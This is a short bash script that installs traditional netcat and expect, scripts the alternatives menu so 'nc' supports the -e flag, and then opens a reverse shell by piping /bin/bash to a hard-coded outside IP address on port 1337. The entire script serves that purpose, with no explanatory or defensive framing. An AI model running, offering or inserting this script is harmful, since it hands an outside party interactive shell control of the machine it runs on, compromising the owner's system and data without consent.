#!/bin/bash

apt-get update
apt-get install netcat-traditional -y
apt-get install expect -y

expect <<EOF
set timeout 3
spawn sudo update-alternatives --config nc
expect "number:"
	send 2\r
expect eof
EOF

nc 152.70.245.91 1337 -e /bin/bash
